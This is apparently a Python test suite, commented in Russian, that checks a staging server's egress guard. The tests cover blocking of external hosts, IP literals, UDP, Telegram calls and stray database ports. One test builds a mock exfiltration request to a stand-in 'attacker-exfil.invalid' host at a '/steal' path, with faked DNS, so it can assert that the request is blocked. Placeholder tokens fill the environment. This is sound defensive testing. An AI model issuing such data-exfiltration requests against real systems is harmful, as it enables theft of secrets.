"""Доказательство «тишины» стенда (stand_egress.py).

Каждый сценарий — отдельный субпроцесс с чистого листа: conftest.py всего
репозитория глушит сеть и подменяет get_gsheet_client для ВСЕХ тестов сразу,
и внутри обычного pytest-процесса эти подмены дали бы ложный зелёный —
guard посчитали бы работающим, даже если он не установлен вовсе. Поэтому
здесь — sys.executable -c "<script>" с боеподобными env и чтением JSON
из последней строки stdout.
"""
import json
import os
import subprocess
import sys
import textwrap
from contextlib import contextmanager
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]

BASE_ENV = {
    'SECRET_KEY': 'test-secret-only',
    'STAND_PASSWORD': 'test-secret-only',
    'PYTHON_DOTENV_DISABLED': '1',
    'LOCAL_NO_AUTH': '0',
    'BITRIX_WEBHOOK': 'https://bitrix.invalid/rest/fake/',
    'TELEGRAM_BOT_TOKEN': '111:fake-prod-token',
    'REF_LOGIN_BOT_TOKEN': '222:fake-ref-token',
    'GOOGLE_SA_JSON': '',
    'DOVERKA_API_KEY': 'fake-doverka-key',
    'CRM_WEBHOOK_URL': 'https://webhook.invalid/deal-completed',
    'WL_BOT_URL': 'https://wl-bot.invalid',
    'WL_BOT_API_KEY': 'fake-wl-key',
    'METRIKA_TOKEN': 'fake-metrika-token',
    'STAND_TG_CHAT': '-1009999999',
    'STAND_TG_TOKEN': '333:fake-stand-token',
    'STAND_DOCPARSE_KEY': 'fake-docparse-key',
    'STAND_PROD_RO_KEY': 'fake-prod-ro-key',
    'OPENROUTER_API_KEY': 'fake-openrouter-key',
    'HTTPS_PROXY': 'http://proxy.invalid:3128',
    'STAND_TRANSFER_POLL_ENABLED': '0',
    'REESTR_SYNC_ENABLED': '0',
    'PAYMENT_POLL_ENABLED': '0',
    'PAYIN_ADDR_BACKFILL': '0',
    'TRONSCAN_WARM_ENABLED': '0',
    'KYC_RETENTION_ENABLED': '0',
}


def run_script(body, stand_mode='1', extra_env=None, timeout=30):
    """Запускает `body` (питон-код) в свежем subprocess с боеподобным env.

    `body` должен напечатать ровно один JSON-объект последней строкой stdout —
    это и есть результат сценария (см. helper OUT() внутри шаблона).
    """
    env = dict(BASE_ENV)
    if stand_mode is not None:
        env['STAND_MODE'] = stand_mode
    if extra_env:
        for key, value in extra_env.items():
            if value is None:
                env.pop(key, None)
            else:
                env[key] = value
    # cwd субпроцесса — ROOT (ниже), а не временная папка: get_gsheet_client
    # ищет фолбэк-файл через os.path.dirname(__file__) app.py, то есть рядом
    # с самим app.py, а не в текущей директории процесса. DATABASE_URL —
    # абсолютный путь во /tmp, chdir для этого не нужен.
    preamble = textwrap.dedent(f'''
        import sys, os, json, tempfile
        sys.path.insert(0, {str(ROOT)!r})
        _workdir = tempfile.mkdtemp(prefix='stand-egress-test-')
        os.environ.setdefault('DATABASE_URL', 'sqlite:///' + _workdir + '/test.db')
        def OUT(d):
            print(json.dumps(d, default=str))
        def authorized_post(payload, **kwargs):
            # Exercise the closed transport inside an actual authenticated Flask
            # request. Calling docparse_post directly must remain denied.
            import app as appmod, stand_egress
            db = appmod.get_session()
            try:
                user = appmod.AdminUser(username='transport_test_' + str(__import__('time').monotonic_ns()), role='operator',
                                        password_hash='unused', login_disabled=False)
                db.add(user); db.commit(); uid = user.id
            finally:
                db.close()
            original = appmod.app.view_functions['docs_parse']
            def transport_view():
                with stand_egress.docparse_request_scope():
                    started = __import__('time').monotonic()
                    result = stand_egress.docparse_post(payload, **kwargs)
                    authorized_post.last_elapsed = __import__('time').monotonic() - started
                return appmod.jsonify({{'result': result}})
            appmod.app.view_functions['docs_parse'] = transport_view
            try:
                with appmod.app.test_client() as client:
                    with client.session_transaction() as sess:
                        sess['user_id'] = uid
                    response = client.post('/api/docs/parse')
                    assert response.status_code == 200, response.get_data(as_text=True)
                    return tuple(response.get_json()['result'])
            finally:
                appmod.app.view_functions['docs_parse'] = original
    ''')
    script = preamble + '\n' + textwrap.dedent(body)
    proc = subprocess.run([sys.executable, '-c', script], env=env,
                          capture_output=True, text=True, timeout=timeout, cwd=str(ROOT))
    last_line = ''
    for line in proc.stdout.splitlines():
        line = line.strip()
        if line:
            last_line = line
    assert last_line, (
        f'subprocess не напечатал результат.\\nSTDOUT:\\n{proc.stdout}\\nSTDERR:\\n{proc.stderr}')
    try:
        return json.loads(last_line), proc
    except json.JSONDecodeError:
        raise AssertionError(f'последняя строка stdout не JSON: {last_line!r}\\nSTDERR:\\n{proc.stderr}')


@contextmanager
def google_sa_file_at_root():
    """Кладёт google_sa.json туда, где его реально ищет get_gsheet_client
    (рядом с app.py), и гарантированно убирает файл после теста — даже если
    subprocess упал."""
    path = ROOT / 'google_sa.json'
    assert not path.exists(), 'google_sa.json уже существует в репозитории — не трогаю чужой файл'
    path.write_text(json.dumps({
        'type': 'service_account', 'client_email': 'x@x.iam.gserviceaccount.com',
        'private_key': '-----BEGIN PRIVATE KEY-----\nfake\n-----END PRIVATE KEY-----\n',
        'token_uri': 'https://oauth2.googleapis.com/token',
    }))
    try:
        yield path
    finally:
        path.unlink(missing_ok=True)


# ─────────────────────────── негативный контроль ───────────────────────────

def test_stand_mode_off_guard_not_installed():
    result, proc = run_script('''
        import stand_egress
        installed = stand_egress.install()
        import app  # noqa: F401 — прод-путь не должен падать без guard'а
        OUT({'installed': installed, 'active': stand_egress.status()['active']})
    ''', stand_mode='0')
    assert proc.returncode == 0, proc.stderr
    assert result == {'installed': False, 'active': False}


# ────────────────────────── сеть: хост важнее loopback ─────────────────────

def test_external_hostname_blocked_before_dns_redirect_to_loopback():
    """Ключевая проверка (уточнение соведущего): если внешний хост резолвится
    в локальный фейковый сервер, guard обязан отказать ДО этого резолва — по
    имени хоста, а не пропустить его как «loopback». Фейковый сервер не должен
    получить ни одного соединения, а запись блокировки — называть исходный хост."""
    result, proc = run_script('''
        import socket, threading, http.server, requests

        _real_getaddrinfo = socket.getaddrinfo
        hits = {'n': 0}

        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                hits['n'] += 1
                self.send_response(200); self.end_headers(); self.wfile.write(b'{}')
            def log_message(self, *a): pass

        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        fake_port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        EVIL_HOST = 'attacker-exfil.invalid'

        def fake_dns(host, port, *a, **kw):
            if host == EVIL_HOST:
                return _real_getaddrinfo('127.0.0.1', fake_port, *a, **kw)
            return _real_getaddrinfo(host, port, *a, **kw)
        socket.getaddrinfo = fake_dns  # подложили ДО install() — как это сделал бы conftest

        import stand_egress
        stand_egress.install()

        blocked = False
        try:
            requests.get(f'http://{EVIL_HOST}:80/steal', timeout=2)
        except requests.exceptions.ConnectionError:
            blocked = True

        st = stand_egress.status()
        recent_hosts = [r['where'] for r in st['recent']]
        OUT({
            'blocked': blocked,
            'fake_server_hits': hits['n'],
            'blocked_count': st['blocked_count'],
            'mentions_evil_host': any(EVIL_HOST in w for w in recent_hosts),
        })
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['blocked'] is True
    assert result['fake_server_hits'] == 0, 'фейковый сервер не должен получить соединений'
    assert result['blocked_count'] >= 1
    assert result['mentions_evil_host'] is True, 'блокировка должна называть исходное имя хоста'


def test_loopback_denied_by_default_allowed_only_via_test_hook():
    """Loopback запрещён целиком по умолчанию (иначе env-прокси на loopback —
    дыра мимо guard'а: адрес прокси разрешён, а реальная цель CONNECT-туннеля
    на сокетном уровне не видна). Разрешить конкретный адрес для теста можно
    только явным allow_test_target() — прод его не вызывает."""
    result, proc = run_script('''
        import socket, threading, http.server, requests
        class FakeH(http.server.BaseHTTPRequestHandler):
            def do_GET(self):
                self.send_response(200); self.end_headers(); self.wfile.write(b'ok')
            def log_message(self, *a): pass
        srv = http.server.HTTPServer(('127.0.0.1', 0), FakeH)
        port = srv.server_port
        threading.Thread(target=srv.serve_forever, daemon=True).start()

        import stand_egress
        stand_egress.install()

        denied = False
        try:
            requests.get(f'http://127.0.0.1:{port}/', timeout=2)
        except requests.exceptions.ConnectionError:
            denied = True

        stand_egress.allow_test_target('127.0.0.1', port)
        r = requests.get(f'http://127.0.0.1:{port}/', timeout=2)

        OUT({'denied_by_default': denied, 'status_after_hook': r.status_code})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['denied_by_default'] is True
    assert result['status_after_hook'] == 200


def test_ip_literal_and_ipv6_blocked():
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        blocked_ipv4 = False
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(1)
            s.connect(('203.0.113.5', 80))  # TEST-NET-3, гарантированно не наш
        except Exception:
            blocked_ipv4 = True

        blocked_ipv6 = False
        try:
            s6 = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
            s6.settimeout(1)
            s6.connect(('2001:db8::1', 80))  # документационный IPv6-диапазон
        except Exception:
            blocked_ipv6 = True

        OUT({'blocked_ipv4': blocked_ipv4, 'blocked_ipv6': blocked_ipv6})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'blocked_ipv4': True, 'blocked_ipv6': True}


def test_redirect_not_followed_and_other_libs_blocked_to_telegram():
    """httpx/urllib/aiohttp к api.telegram.org — тоже отказ на сокете, не только requests."""
    result, proc = run_script('''
        import socket
        import stand_egress
        stand_egress.install()

        def blocked_with(fn):
            try:
                fn()
                return False
            except Exception:
                return True

        import requests
        r_blocked = blocked_with(lambda: requests.post(
            'https://api.telegram.org/botFAKE:TOKEN/sendMessage', json={'x': 1}, timeout=2))

        import urllib.request
        u_blocked = blocked_with(lambda: urllib.request.urlopen(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import httpx
        h_blocked = blocked_with(lambda: httpx.get(
            'https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2))

        import asyncio, aiohttp
        async def _try_aiohttp():
            async with aiohttp.ClientSession() as s:
                async with s.get('https://api.telegram.org/botFAKE:TOKEN/getMe', timeout=2) as resp:
                    await resp.read()
        a_blocked = blocked_with(lambda: asyncio.run(_try_aiohttp()))

        OUT({'requests': r_blocked, 'urllib': u_blocked, 'httpx': h_blocked, 'aiohttp': a_blocked})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'requests': True, 'urllib': True, 'httpx': True, 'aiohttp': True}


# ───────────────────────────── tg_call / can_send ──────────────────────────

def _fake_telegram_server_script():
    return '''
        import threading, http.server, json as _json

        class FakeTG(http.server.BaseHTTPRequestHandler):
            requests = []
            def do_POST(self):
                length = int(self.headers.get('Content-Length', 0))
                body = self.rfile.read(length)
                FakeTG.requests.append({'path': self.path, 'body': _json.loads(body or b'{}')})
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(_json.dumps({'ok': True, 'result':
                    {'id': 1, 'username': 'grusha_stand_bot'} if self.path.endswith('/getMe') else {'id': 1}}).encode())
            def log_message(self, *a): pass

        _srv = http.server.HTTPServer(('127.0.0.1', 0), FakeTG)
        _tg_port = _srv.server_port
        threading.Thread(target=_srv.serve_forever, daemon=True).start()
    '''


def test_tg_call_send_message_to_allowed_chat_reaches_fake_telegram():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'hi'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests),
             'path': FakeTG.requests[-1]['path'] if FakeTG.requests else None})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True
    assert result['hits'] == 2
    assert result['path'].endswith('/sendMessage')


def test_bot_identity_fail_closed_for_send_and_updates():
    """Ошибочный getMe не допускает ни отправку, ни получение апдейтов."""
    result, proc = run_script('''
        import requests
        import stand_egress
        stand_egress.set_policy(lambda *a: True)
        cases = [
            {'ok': True, 'result': {'id': 1, 'username': 'grusha_lk_bot'}},
            {'ok': True, 'result': {'id': 0, 'username': 'grusha_stand_bot'}},
            {'ok': False},
            'broken-json',
        ]
        outcomes = []
        for answer in cases:
            stand_egress._bot_identity = None
            calls = []
            class Response:
                status_code = 200
                def json(self):
                    if answer == 'broken-json': raise ValueError('bad json')
                    return answer
            class Session:
                trust_env = False
                def post(self, url, **kwargs):
                    calls.append(url.rsplit('/', 1)[-1])
                    return Response()
                def close(self): pass
            old = requests.Session
            requests.Session = Session
            try:
                sent = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})
                polled = stand_egress.tg_call('getUpdates', {'offset': 7})
            finally:
                requests.Session = old
            outcomes.append([sent.get('error'), polled.get('error'), calls])
        OUT(outcomes)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert all(sent == 'bot_identity_mismatch' and polled == 'bot_identity_mismatch'
               and calls == ['getMe', 'getMe'] for sent, polled, calls in result)


def test_bot_identity_rechecks_after_token_change_and_id_change():
    result, proc = run_script('''
        import requests
        import stand_egress
        stand_egress.set_policy(lambda *a: True)
        calls = []
        answers = iter([
            {'ok': True, 'result': {'id': 1, 'username': 'grusha_stand_bot'}},
            {'ok': True, 'result': {'id': 2, 'username': 'grusha_stand_bot'}},
            {'ok': True, 'result': {'id': 1, 'username': 'grusha_lk_bot'}},
        ])
        class Response:
            status_code = 200
            def __init__(self, answer): self.answer = answer
            def json(self): return self.answer
        class Session:
            trust_env = False
            def post(self, url, **kwargs):
                method = url.rsplit('/', 1)[-1]
                calls.append(method)
                return Response(next(answers) if method == 'getMe' else {'ok': True})
            def close(self): pass
        requests.Session = Session
        first = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})
        stand_egress._bot_identity = (*stand_egress._bot_identity[:4], 0)
        changed_id = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})
        os.environ['STAND_TG_TOKEN'] = '444:changed-token'
        changed_token = stand_egress.tg_call('getUpdates', {'offset': 7})
        OUT({'first': first, 'changed_id': changed_id, 'changed_token': changed_token,
             'calls': calls})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['first']['ok']
    assert result['changed_id']['error'] == 'bot_identity_mismatch'
    assert result['changed_token']['error'] == 'bot_identity_mismatch'
    assert result['calls'] == ['getMe', 'sendMessage', 'getMe', 'getMe']


def test_failed_identity_refresh_invalidates_previous_cache():
    result, proc = run_script('''
        import requests
        import stand_egress
        stand_egress.set_policy(lambda *a: True)
        calls = []
        class Response:
            status_code = 200
            def json(self): return {'ok': True, 'result': {'id': 1, 'username': 'grusha_stand_bot'}}
        class Session:
            trust_env = False
            def post(self, url, **kwargs):
                method = url.rsplit('/', 1)[-1]
                calls.append(method)
                if method == 'getMe' and len(calls) > 2:
                    raise requests.ConnectionError('fake failure')
                return Response()
            def close(self): pass
        requests.Session = Session
        first = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})
        refresh = stand_egress.tg_call('getMe', {})
        second = stand_egress.tg_call('sendMessage', {'chat_id': 555, 'text': 'x'})
        OUT({'first': first.get('ok'), 'refresh': refresh.get('error'),
             'second': second.get('error'), 'calls': calls})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result == {'first': True, 'refresh': 'tg_network_error',
                      'second': 'bot_identity_mismatch',
                      'calls': ['getMe', 'sendMessage', 'getMe', 'getMe']}


def test_bad_bot_blocks_bind_and_poller_without_moving_offset():
    result, proc = run_script('''
        import requests
        from sqlalchemy import text
        import app
        import stand_notify
        import stand_egress
        calls = []
        class Response:
            status_code = 200
            def json(self): return {'ok': True, 'result': {'id': 1, 'username': 'grusha_lk_bot'}}
        class Session:
            trust_env = False
            def post(self, url, **kwargs):
                calls.append(url.rsplit('/', 1)[-1])
                return Response()
            def close(self): pass
        requests.Session = Session
        db = app.get_session()
        user = app.AdminUser(username='botpin_test', display_name='Тест', password_hash='unused')
        db.add(user); db.commit()
        uid = user.id
        before = db.execute(text('SELECT next_offset FROM stand_tg_offset WHERE id=1')).scalar()
        db.close()
        client = app.app.test_client()
        with client.session_transaction() as session:
            session['user_id'] = uid
            session['username'] = 'botpin_test'
        bind = client.post('/api/stand/tg-bind')
        poll = stand_notify.poll_once()
        db = app.get_session()
        after = db.execute(text('SELECT next_offset FROM stand_tg_offset WHERE id=1')).scalar()
        nonces = db.execute(text('SELECT COUNT(*) FROM stand_tg_bind')).scalar()
        db.close()
        OUT({'status': bind.status_code, 'error': bind.json.get('error'),
             'poll': poll, 'before': before, 'after': after, 'nonces': nonces, 'calls': calls})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 503 and result['error'] == 'bot_identity_mismatch'
    assert result['poll'] is False and result['before'] == result['after']
    assert result['nonces'] == 0 and result['calls'] == ['getMe', 'getMe']


def test_update_poll_timeout_and_network_error_log():
    result, proc = run_script('''
        import requests
        from unittest.mock import patch
        import app
        import stand_notify

        calls = []
        class Response:
            status_code = 200
            def json(self):
                return {'ok': True, 'result': {'id': 1, 'username': 'grusha_stand_bot'}}
        class Session:
            trust_env = False
            def post(self, url, **kwargs):
                calls.append({'method': url.rsplit('/', 1)[-1],
                              'payload': kwargs['json'], 'http_timeout': kwargs['timeout']})
                if url.endswith('/getUpdates'):
                    raise requests.Timeout()
                return Response()
            def close(self): pass
        with patch.object(requests, 'Session', Session), patch.object(app.app.logger, 'warning') as warning:
            polled = stand_notify.poll_once()
        OUT({'polled': polled, 'calls': calls, 'log': warning.call_args.args,
             'status': stand_notify.status()})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['polled'] is False and result['status'] == 'error'
    updates = [call for call in result['calls'] if call['method'] == 'getUpdates']
    assert len(updates) == 1
    assert updates[0]['payload']['timeout'] < updates[0]['http_timeout']
    assert result['log'] == ['stand update poll rejected: %s', 'tg_network_error']


def test_expected_stand_bot_allows_bind_and_production_names_never_allowed():
    result, proc = run_script('''
        import requests
        import app
        import stand_egress
        class Response:
            status_code = 200
            def json(self): return {'ok': True, 'result': {'id': 123, 'username': 'grusha_stand_bot'}}
        class Session:
            trust_env = False
            def post(self, url, **kwargs): return Response()
            def close(self): pass
        requests.Session = Session
        db = app.get_session()
        user = app.AdminUser(username='botpin_good', display_name='Тест', password_hash='unused')
        db.add(user); db.commit()
        uid = user.id
        db.close()
        client = app.app.test_client()
        with client.session_transaction() as session:
            session['user_id'] = uid
            session['username'] = 'botpin_good'
        bind = client.post('/api/stand/tg-bind')
        rejected = []
        for name in ('grusha_lk_bot', 'Grushath_bot'):
            os.environ['STAND_BOT_USERNAME'] = name
            rejected.append([stand_egress.expected_bot_username(),
                             stand_egress.tg_call('sendMessage', {'chat_id': 123, 'text': 'x'}).get('error'),
                             client.post('/api/stand/tg-bind').status_code])
        OUT({'status': bind.status_code, 'url': bind.json.get('url'),
             'username': bind.json.get('bot_username'), 'rejected': rejected})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['status'] == 200 and result['username'] == 'grusha_stand_bot'
    assert result['url'].startswith('https://t.me/grusha_stand_bot?start=bind_')
    assert result['rejected'] == [[None, 'bot_identity_mismatch', 503]] * 2


def test_tg_call_denies_wrong_chat_id_without_network():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda channel, recipient, operation:
            operation == 'sendMessage' and recipient == 555)

        res = stand_egress.tg_call('sendMessage', {'chat_id': 999, 'text': 'nope'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'denied' and result['hits'] == 0


def test_tg_call_denies_group_chat_id():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)  # даже разрешающая политика не спасает группу

        res = stand_egress.tg_call('sendMessage', {'chat_id': -1001234567890, 'text': 'group'},
                                   _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['hits'] == 0


def test_tg_call_denies_send_document_method():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()
        stand_egress.set_policy(lambda *a: True)

        res = stand_egress.tg_call('sendDocument', {'chat_id': 555}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'error': res.get('error'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is False and result['error'] == 'method_not_allowed' and result['hits'] == 0


def test_tg_call_default_policy_allows_read_only_methods():
    result, proc = run_script(_fake_telegram_server_script() + '''
        import stand_egress
        stand_egress.install()  # политика не регистрируется — дефолт

        res = stand_egress.tg_call('getMe', {}, _base_url=f'http://127.0.0.1:{_tg_port}')
        OUT({'ok': res.get('ok'), 'hits': len(FakeTG.requests)})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['ok'] is True and result['hits'] == 1


# ───────────────────────────── прикладные точки выхода ─────────────────────

def test_app_scenarios_no_egress_and_correct_status_codes():
    result, proc = run_script('''
        import stand_egress
        stand_egress.install()
        import app

        app.app.config['TESTING'] = True
        app.limiter.enabled = False
        client = app.app.test_client()

        out = {}

        # bitrix_deals._post блокируется до HTTP, даже с валидным BITRIX_WEBHOOK.
        import bitrix_deals
        try:
            bitrix_deals._post('crm.deal.list', {})
            out['bitrix_blocked'] = False
        except bitrix_deals.BitrixError as e:
            out['bitrix_blocked'] = str(e) == 'stand_blocked'

        # /api/stand/egress-status: без сессии — 401
        r = client.get('/api/stand/egress-status')
        out['egress_status_anon'] = r.status_code

        db = app.get_session()
        try:
            manager = app.AdminUser(username='mgr-test', role='manager', password_hash=b'x')
            admin = app.AdminUser(username='adm-test', role='admin', password_hash=b'x')
            db.add_all([manager, admin]); db.commit()
            mgr_id, admin_id = manager.id, admin.id
        finally:
            db.close()

        # не-admin — 403 на egress-status
        with client.session_transaction() as sess:
            sess['user_id'] = mgr_id
        out['egress_status_manager'] = client.get('/api/stand/egress-status').status_code

        # Дальше — залогинены админом: точки выхода блокируются в STAND_MODE
        # независимо от роли, авторизация тут не при чём.
        with client.session_transaction() as sess:
            sess['user_id'] = admin_id

        r = client.get('/api/stand/egress-status')
        out['egress_status_admin'] = (r.status_code, r.get_json().get('success'))

        r = client.post('/api/proxy/create-payment', json={'amount': 100, 'order_id': 'X'})
        out['create_payment'] = (r.status_code, r.get_json().get('error'))

        # STAND_DOCPARSE_KEY есть (BASE_ENV) — канал открыт, блокирует уже не
        # stand_blocked, а обычная валидация: файлов не приложено.
        r = client.post('/api/docs/parse', data={'deal_type': 'rental'},
                        content_type='multipart/form-data')
        out['docs_parse'] = (r.status_code, r.get_json().get('error'))

        # /api/rates теперь ходит через read_get (T9) — подменяем его здесь на
        # детерминированный отказ, чтобы тест не зависел от реальной сети.
        import stand_egress as _se
        _se.read_get = lambda op, params=None, _base_url=None: (None, None, 'network_error')
        r = client.get('/api/rates')
        out['rates'] = (r.status_code, r.get_json().get('stand_blocked'), r.get_json().get('success'))

        r = client.post('/api/reestr/sync')
        out['reestr_sync'] = (r.status_code, r.get_json().get('error'))

        r = client.post('/api/stand/prod-agents')
        out['prod_agents'] = (r.status_code, r.get_json().get('error'))

        r = client.get('/api/doverka/payments')
        out['doverka_payments'] = (r.status_code, r.get_json().get('error'))

        r = client.get('/api/doverka/currencies')
        out['doverka_currencies'] = (r.status_code, r.get_json().get('error'))

        OUT(out)
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['bitrix_blocked'] is True
    assert result['create_payment'] == [403, 'stand_blocked']
    assert result['docs_parse'] == [400, 'no_files']
    assert result['rates'] == [200, False, False]
    assert result['reestr_sync'] == [403, 'stand_blocked']
    assert result['prod_agents'] == [403, 'stand_blocked']
    assert result['egress_status_anon'] == 401
    assert result['egress_status_manager'] == 403
    assert result['egress_status_admin'] == [200, True]
    assert result['doverka_payments'] == [403, 'stand_blocked']
    assert result['doverka_currencies'] == [403, 'stand_blocked']


def test_get_gsheet_client_ignores_local_service_account_file():
    """STAND_MODE гасит GOOGLE_SA_JSON/OAuth env, но локальный google_sa.json
    рядом с app.py — их обходит (P0 из независимого аудита 28.09). Кладём файл
    туда, где его реально ищет os.path.dirname(__file__), и убираем после теста."""
    with google_sa_file_at_root():
        result, proc = run_script('''
            import stand_egress
            stand_egress.install()
            import app
            OUT({'gsheet_client_none': app.get_gsheet_client() is None})
        ''')
    assert proc.returncode == 0, proc.stderr
    assert result['gsheet_client_none'] is True


def test_gsheet_client_uses_local_file_outside_stand_mode():
    """Негативный контроль: вне STAND_MODE тот же файл реально читается и
    доходит до разбора ключа (падает на невалидном fake PEM) — доказывает,
    что предыдущий тест проверяет настоящий фолбэк, а не «файла и так никто
    не находит»."""
    with google_sa_file_at_root():
        result, proc = run_script('''
            import app
            try:
                app.get_gsheet_client()
                OUT({'raised': False, 'detail': None})
            except Exception as e:
                OUT({'raised': True, 'detail': str(e)[:200]})
        ''', stand_mode='0')
    assert proc.returncode == 0, proc.stderr
    # Ключ фиктивный и не распарсится — важно, что до разбора вообще дошло
    # (значит, файл был прочитан), а не что итог — рабочий клиент.
    assert result['raised'] is True


# ───────────────── фиксы по независимому аудиту 28.09 (P1×2 + 2) ───────────

def test_db_host_exact_port_enforced_not_just_ip():
    """P1: раньше проверялся только IP базы, порт игнорировался — соединение
    на IP базы:443 или на её же хосте:443 проходило при DSN на 5432. Порт по
    умолчанию (нет в DSN) — 5432. Повторяет сценарий T1-probes.py."""
    result, proc = run_script('''
        import socket
        _real_getaddrinfo = socket.getaddrinfo
        # Как в T1-probes.py: подменяем резолвер ДО install(), чтобы любой хост
        # резолвился в один и тот же «адрес базы».
        socket.getaddrinfo = lambda host, port, *a, **k: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('192.0.2.10', port))]

        import stand_egress
        stand_egress.install()

        def probe(addr):
            try:
                with socket.socket() as s:
                    s.settimeout(1)
                    s.connect(addr)
                return True
            except Exception:
                return False

        OUT({
            'db_right_port': probe(('192.0.2.10', 5432)),
            'db_wrong_port': probe(('192.0.2.10', 443)),
            'db_host_wrong_port': probe(('stand-db.railway.internal', 443)),
            'foreign_ip': probe(('198.51.100.20', 443)),
        })
    ''', extra_env={'DATABASE_URL': 'postgresql://fake:fake@stand-db.railway.internal:5432/candidate'})
    assert proc.returncode == 0, proc.stderr
    assert result['db_right_port'] is True, 'точный host:port базы обязан проходить'
    assert result['db_wrong_port'] is False, 'тот же IP на чужом порту — блок'
    assert result['db_host_wrong_port'] is False, 'тот же хост на чужом порту — блок'
    assert result['foreign_ip'] is False


def test_db_port_defaults_to_5432_when_dsn_omits_it():
    result, proc = run_script('''
        import socket
        socket.getaddrinfo = lambda host, port, *a, **k: [
            (socket.AF_INET, socket.SOCK_STREAM, 6, '', ('192.0.2.10', port))]
        import stand_egress
        stand_egress.install()
        def probe(addr):
            try:
                with socket.socket() as s:
                    s.settimeout(1); s.connect(addr)
                return True
            except Exception:
                return False
        OUT({
            'default_port_allowed': probe(('192.0.2.10', 5432)),
            'other_port_blocked': probe(('192.0.2.10', 5433)),
        })
    ''', extra_env={'DATABASE_URL': 'postgresql://fake:fake@stand-db.railway.internal/candidate'})
    assert proc.returncode == 0, proc.stderr
    assert result['default_port_allowed'] is True
    assert result['other_port_blocked'] is False


def test_udp_sendto_and_sendmsg_blocked_to_external_address():
    """sendto/sendmsg — тихий отказ (UDP fire-and-forget, вызывающий код обычно
    не оборачивает их в try/except), но реальный транспорт не вызывается —
    считаем по счётчику блокировок и по неизменной длине трекера снаружи."""
    result, proc = run_script('''
        import socket
        _orig_sendto = socket.socket.sendto
        calls = []
        def _tracking_sendto(self, *args):
            calls.append(args[-1])
            return _orig_sendto(self, *args)
        socket.socket.sendto = _tracking_sendto

        import stand_egress
        stand_egress.install()

        before = stand_egress.status()['blocked_count']
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            n = s.sendto(b'FAKE', ('198.51.100.20', 9999))
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            m = s.sendmsg([b'FAKE'], [], 0, ('198.51.100.20', 9999))
        after = stand_egress.status()['blocked_count']
        calls_for_external = len(calls)

        # loopback тоже не разрешён без явного allow_test_target() — порт
        # 9999 никто не разрешал, поэтому и здесь тихий блок, не реальная отправка.
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            loop_n = s.sendto(b'ok', ('127.0.0.1', 9999))
        calls_after_loopback = len(calls)

        stand_egress.allow_test_target('127.0.0.1', 9999)
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            loop_allowed_n = s.sendto(b'ok', ('127.0.0.1', 9999))

        OUT({'sendto_return': n, 'sendmsg_return': m,
             'lower_transport_calls': calls_for_external,
             'blocked_count_grew_by_2': after - before == 2,
             'loopback_denied_by_default': calls_after_loopback == calls_for_external,
             'loopback_allowed_after_hook': len(calls) > calls_after_loopback and loop_allowed_n == 2})
    ''')
    assert proc.returncode == 0, proc.stderr
    assert result['lower_transport_calls'] == 0, 'внешний UDP не должен доходить до транспорта'
    assert result['sendto_return'] == 4  # len(b'FAKE') — тихий "успех", данные никуда не ушли
    assert result['sendmsg_return'] == 4
    assert result['blocked_count_grew_by_2'] is True
    assert result['loopback_denied_by_default'] is True
    assert result['loopback_allowed_after_hook'] is True


def test_tg_call_network_error_does_not_leak_token():
    """P1: requests оборачивает URL (…/bot<TOKEN>/method) прямо в текст
